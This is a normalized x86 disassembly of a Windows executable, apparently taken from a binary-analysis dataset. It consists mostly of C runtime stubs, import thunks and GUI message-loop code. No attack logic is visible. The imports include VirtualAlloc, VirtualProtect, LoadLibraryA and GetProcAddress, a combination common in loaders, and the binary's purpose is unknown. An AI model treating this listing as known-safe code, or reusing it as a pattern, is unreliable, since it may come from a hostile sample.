retn
sub_42311a
retn
sub_42311b
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_42312c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
call sub_423162
sub_423162
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_42317d
push [ ebp + 0x8 ]
call sub_424fc7
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn 0x4
sub_4231b5
push ebp
mov ebp esp
mov ecx [ ecx ]
add ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_4231c3
retn
sub_4231c4
mov eax [ eax ]
retn
sub_4231c7
mov eax [ eax ]
retn
sub_4231ca
mov eax [ eax ]
retn
sub_4231cd
mov eax [ eax ]
retn
sub_4231d0
mov eax [ eax ]
retn
sub_4231d3
mov eax [ eax ]
retn
sub_4231d6
mov eax [ eax ]
retn
sub_4231d9
mov eax [ eax ]
retn
sub_4231dc
mov eax [ eax ]
retn
sub_4231df
mov eax [ eax ]
retn
sub_4231e2
mov eax [ eax ]
retn
sub_4231e5
mov eax [ eax ]
retn
sub_4231e8
mov eax [ eax ]
retn
sub_4231eb
mov eax [ eax ]
retn
sub_4231ee
mov eax [ eax ]
retn
sub_4231f1
mov eax [ eax ]
retn
sub_4231f4
mov edx [ ecx + 0x20 ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ ecx + 0x28 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42320c
mov edx [ ecx + 0x20 ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ ecx + 0x28 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_423224
mov edx [ ecx + 0x20 ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ ecx + 0x28 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42323c
mov edx [ ecx + 0x20 ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ ecx + 0x28 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_423254
mov edx [ ecx + 0x38 ]
cmp edx [ ecx + 0x3c ]
je r-xdata
mov ecx [ ecx + 0x40 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42326c
mov edx [ ecx + 0x38 ]
cmp edx [ ecx + 0x3c ]
je r-xdata
mov ecx [ ecx + 0x40 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_423284
mov edx [ ecx + 0x38 ]
cmp edx [ ecx + 0x3c ]
je r-xdata
mov ecx [ ecx + 0x40 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42329c
mov edx [ ecx + 0x38 ]
cmp edx [ ecx + 0x3c ]
je r-xdata
mov ecx [ ecx + 0x40 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_4232b4
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_4232be
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_4232c8
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4232e7
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_423306
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_423325
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_423344
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_423363
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_423382
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4233a1
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4233c0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov ecx [ ecx + 0x10 ]
add ecx edx
mov [ eax ] ecx
retn
sub_4233d4
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ eax ] ecx
retn
mov ecx [ ecx ]
sub_4233df
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4233f4
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_423409
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_42341e
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_423433
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_423448
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_42345d
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_423472
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
j_sub_423b01
jmp sub_423b01
j_sub_423b55
jmp sub_423b55
j_sub_423b9c
jmp sub_423b9c
j_sub_423bb6
jmp sub_423bb6
sub_42349b
mov edx [ eax ]
cmp edx [ ecx ]
jb r-xdata
retn
mov eax ecx
j_sub_423be3
jmp sub_423be3
j_sub_423c2f
jmp sub_423c2f
j_sub_423c49
jmp sub_423c49
sub_423541
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_42356b
test eax eax
je r-xdata
retn
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_42357a
retn
sub_423598
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_423c9a
mov [ esi ] eax
add esp 0xc
mov eax esi
pop ebp
retn
sub_423638
retn
sub_423639
push ebp
mov ebp esp
lea eax [ ebp + 0xf ]
push eax
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
call sub_41c5a5
pop ebp
retn 0x8
sub_42374a
retn
sub_42374b
push ebp
mov ebp esp
lea eax [ ebp + 0xf ]
push eax
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
call sub_41c621
pop ebp
retn 0x8
sub_42389e
retn
sub_42389f
mov eax [ eax ]
jmp sub_408952
sub_423a24
retn
sub_423a25
mov eax [ eax ]
jmp sub_408952
sub_423ae8
mov eax [ eax ]
retn
sub_423aeb
mov eax [ eax ]
retn
sub_423aee
mov eax [ eax ]
retn
sub_423af1
mov eax [ eax ]
retn
sub_423af4
mov eax [ eax ]
retn
sub_423af7
mov eax [ eax ]
retn
sub_423afa
mov eax [ eax ]
retn
sub_423afd
mov eax [ eax ]
retn
sub_423b00
retn
sub_423be3
mov ecx [ eax ]
cmp ecx [ eax + 0x10 ]
jne r-xdata
inc ecx
mov [ eax ] ecx
mov al 0x1
retn
mov [ eax + 0x1d ] 0x1
xor al al
retn
sub_423c7a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_423d77
pop ebp
retn
sub_423c87
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
sub_423c92
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_423cc6
mov [ eax ] ecx
retn
j_sub_423db8
jmp sub_423db8
j_sub_423df3
jmp sub_423df3
sub_423d4e
mov [ eax ] ecx
retn
sub_423d51
mov eax [ eax ]
retn
sub_423d54
push ebp
mov ebp esp
movzx ecx [ eax ]
mov eax [ eax + 0x4 ]
mov ax [ eax + ecx * 2 ]
and ax [ ebp + 0x8 ]
xor ecx ecx
xor edx edx
cmp cx ax
sete al
pop ebp
retn 0x4
sub_423d73
mov al 0x1
retn
sub_423d76
retn
sub_423da5
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_423e8d
mov al 0x1
retn
sub_423e90
retn
sub_423e91
retn
sub_423e92
sub ecx [ ecx - 0x4 ]
jmp sub_4062e4
sub_424000
mov dl [ ecx ]
mov eax 0x6
xor ecx ecx
test eax eax
sete cl
mov eax ecx
retn
dec eax
jne r-xdata
cmp [ ecx + eax ] dl
jne r-xdata
sub_424020
add eax 0x8
mov ecx 0x1000
jmp r-xdata
mov [ eax ] 0x0
add eax 0x8
dec ecx
jne r-xdata
retn
sub_424040
retn
sub_424050
mov eax ecx
shr eax 0xc
xor eax ecx
and eax 0xfff
retn
sub_424060
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x4
ja r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax ]
pop ebp
retn
sub_424080
mov ecx [ eax ]
mov eax ecx
shr eax 0xc
xor eax ecx
and eax 0xfff
retn
sub_424090
dec eax
cmp eax 0x3
ja r-xdata
retn
jmp [ eax * 4 + jump_table_4240a8 ]
mov [ ecx ] edx
retn
mov [ ecx ] dx
retn
mov [ ecx ] dl
sub_424140
mov cl [ eax ]
and cl 0x2
sub cl 0x2
movsx eax cl
neg eax
sbb eax eax
and eax 0xfffffffd
lea eax [ eax + eax + 0x9 ]
retn
sub_424160
xor ecx ecx
sub edx eax
push edi
mov edi [ edx + eax ]
mov [ eax ] edi
add ecx 0x3
add eax 0x3
cmp ecx esi
jb r-xdata
pop edi
retn
sub_424180
mov ecx [ edx ]
mov eax ecx
shr eax 0xc
xor eax ecx
and eax 0xfff
mov [ esi + eax * 4 ] edx
mov [ eax + esi + 0x4000 ] 0x1
retn
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
__imp_GetTickCount
jmp [ GetTickCount@IAT ]
Sleep
jmp [ Sleep@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
DialogBoxParamA
jmp [ DialogBoxParamA@IAT ]
LoadCursorA
jmp [ LoadCursorA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
ShowWindow
jmp [ ShowWindow@IAT ]
LoadAcceleratorsA
jmp [ LoadAcceleratorsA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
EndDialog
jmp [ EndDialog@IAT ]
TranslateAcceleratorA
jmp [ TranslateAcceleratorA@IAT ]
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RegisterClassExA
jmp [ RegisterClassExA@IAT ]
GetMessageA
jmp [ GetMessageA@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
sub_424f94
mov edi edi
push ebp
mov ebp esp
call sub_426c39
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_424fa6
call sub_426c39
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_425217
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_427039
pop ecx
pop ecx
retn
sub_42522b
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_42663e
push eax
call sub_426619
sub_425245
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_427905
retn
_start
call sub_427adf
jmp sub_4250e8
sub_42525f
mov eax ecx
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x0
retn
sub_425270
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_42528d
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_4252da
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_42578a
pop ecx
sub_425354
mov [ ecx ] r--data
jmp sub_4252da
sub_42537d
mov [ ecx ] r--data
jmp sub_4252da
sub_4253a6
mov [ ecx ] r--data
jmp sub_4252da
sub_4253b1
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425388
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4253ce
mov [ ecx ] r--data
jmp sub_4252da
sub_42544c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_425490
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4254d4
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425490
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4254f1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push ecx
call sub_427cdb
pop ecx
pop ecx
pop ebp
retn 0x4
sub_425505
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_427c6b
pop ecx
retn
sub_425536
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push ecx
call sub_427e70
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42554c
push ecx
call sub_427dcd
pop ecx
retn
sub_4255b9
lea eax [ ecx + 0x8 ]
retn
sub_4255bd
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_4255c8
mov eax ecx
retn 0x4
sub_4255cd
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_424ff8
sub_42587d
call sub_426c39
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4294bb
sub_426064
call sub_42634f
retn
sub_42606a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42602e
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_42608c
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_426691
push 0x1
push 0x0
call sub_42a071
add esp 0xc
jmp sub_42a03e
call eax
sub_4260dd
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_4262f3
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_42632e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_426303
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_426346
push 0x8
call sub_42b166
pop ecx
retn
sub_42634f
push 0x8
call sub_42b075
pop ecx
retn
sub_4265ee
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_42b075
pop ecx
sub_426603
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_4264c3
add esp 0xc
pop ebp
retn
sub_426619
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_4264c3
add esp 0xc
pop ebp
retn
sub_42662f
push 0x1
push 0x0
push 0x0
call sub_4264c3
add esp 0xc
retn
sub_42663e
push 0x1
push 0x1
push 0x0
call sub_4264c3
add esp 0xc
retn
sub_42664d
mov edi edi
push ebp
mov ebp esp
call sub_426840
push [ ebp + 0x8 ]
call sub_426691
pop ecx
push 0xff
call sub_426619
int3
sub_426879
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_426897
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_4268ab
mov eax [ rw-data ]
retn
sub_4269c8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_426a0e
push 0x0
call sub_4269d7
pop ecx
retn
sub_426a17
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_426a4c
push 0x0
call [ EncodePointer@IAT ]
retn
sub_426a55
call [ TlsAlloc@IAT ]
retn 0x4
sub_426a5e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_426a78
mov eax [ rw-data ]
retn
sub_426ab2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ebp
retn 0x8
sub_426bae
push 0xd
call sub_42b075
pop ecx
retn
sub_426bb7
push 0xc
call sub_42b075
pop ecx
retn
sub_426d6d
push 0xd
call sub_42b075
pop ecx
retn
sub_426d79
push 0xc
call sub_42b075
pop ecx
retn
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
sub_427005
push sub_426fc3
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_4272de
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_427905
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_427920
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
jmp sub_4247dc
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_4247dc
sub_427cd2
push 0xe
call sub_42b075
pop ecx
retn
sub_427dc4
push 0xe
call sub_42b075
pop ecx
retn
sub_427e34
push 0xe
call sub_42b075
pop ecx
retn
sub_427f73
push 0xe
call sub_42b075
pop ecx
retn
sub_427fc6
push 0xe
call sub_42b075
pop ecx
retn
sub_428085
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0xe ]
shr eax 0x4
and eax 0x7ff
sub eax 0x3fe
cwde
pop ebp
retn
sub_428272
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4255d8
add esp 0xc
pop ebp
retn
sub_428627
mov edi edi
push ebp
mov ebp esp
mov eax 0x7ff0
mov ecx eax
and cx [ ebp + 0xe ]
xor edx edx
cmp cx ax
setne dl
mov eax edx
pop ebp
retn
sub_428f9f
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_428faf
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_429043
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
stmxcsr [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
sub_42908e
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_4290d3
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
je r-xdata
leave
retn
stmxcsr [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0xffffffc0
ldmxcsr [ ebp - 0x4 ]
sub_4290f0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
retn
call sub_429043
and eax 0x3f
sub_429103
xor eax eax
cmp [ rw-data ] eax
je r-xdata
retn
call sub_429043
and eax 0x3f
jmp sub_4290d3
sub_429152
mov edi edi
push ebp
mov ebp esp
call sub_429043
mov ecx [ ebp + 0x8 ]
and ecx 0x3f
or eax ecx
push eax
call sub_429061
pop ecx
pop ebp
retn
sub_42916d
mov eax sub_432552
mov [ rw-data ] eax
mov [ rw-data ] sub_431beb
mov [ rw-data ] sub_431b9f
mov [ rw-data ] sub_431bd8
mov [ rw-data ] sub_431b41
mov [ rw-data ] eax
mov [ rw-data ] sub_4324ca
mov [ rw-data ] sub_431b5d
mov [ rw-data ] sub_431abf
mov [ rw-data ] sub_431a4b
retn
sub_4291cd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
sub_4291e2
mov edi edi
push ebp
mov ebp esp
call sub_42916d
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_432575
sub_429528
push 0xc
call sub_42b075
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_429534
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_429693
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_4296c5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4296a0
int3
sub_42974a
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4296df
sub_429917
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42989e
add esp 0x14
pop ebp
retn
sub_429be9
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_42a00f
pop ecx
pop ecx
retn
sub_429c18
push 0x1
call sub_42b075
pop ecx
retn
sub_429c6a
push [ ebp + 0x8 ]
call sub_429fd3
pop ecx
retn
sub_429c74
push 0x1
call sub_429b47
pop ecx
retn
sub_429cff
push [ ebp + 0x8 ]
call sub_429fd3
pop ecx
retn
sub_429d09
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4372ed
add esp 0x10
pop ebp
retn
sub_429d25
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43730d
add esp 0x10
pop ebp
retn
sub_429d41
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43730d
add esp 0x10
pop ebp
retn
sub_429d5c
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43732d
add esp 0x10
pop ebp
retn
sub_429d78
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43732d
add esp 0x10
pop ebp
retn
sub_429e7f
push [ ebp + 0x8 ]
call sub_429fd3
pop ecx
retn
sub_429f40
call sub_429c74
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_42578a
pop ecx
retn
call sub_4373db
sub_42a092
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_42a12c
push edi
call sub_42b075
pop ecx
retn
sub_42a183
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_42a190
call sub_426c39
add eax 0x64
retn
sub_42a199
call sub_426c39
add eax 0x60
retn
sub_42a3a7
push 0x0
call sub_42b075
pop ecx
retn
sub_42a549
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_42b075
pop ecx
sub_42a821
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_42a6f1
pop ebp
retn
sub_42ac63
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42ac98
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
sub_42afbd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42afcc
and [ rw-data ] 0x0
retn
sub_42b075
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_42b08c
push [ esp + 0x4 ]
push 0x0
call [ FatalAppExitA@IAT ]
push 0xff
call sub_42632e
sub_42b15d
push 0xa
call sub_42b075
pop ecx
retn
sub_42b199
push 0x8
push r--data
call sub_4278c0
call sub_426c39
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_42a03e
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_42b1b9
xor eax eax
inc eax
retn
sub_42b1d2
call sub_426c39
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_42b199
call eax
sub_42b209
xor eax eax
inc eax
retn
sub_42b21d
push sub_42b199
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_42b22e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42b46b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_42b49c
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
mov eax [ ecx + 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_42b4aa
mov eax ecx
retn
sub_42b76b
push 0xd
call sub_42b075
pop ecx
retn
sub_42bbff
push 0xd
call sub_42b075
pop ecx
retn
sub_42bc38
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_42ba9e
pop ecx
mov [ rw-data ] 0x1
sub_42bca9
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bcc2
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bcda
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bcf3
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bd0b
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bd24
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
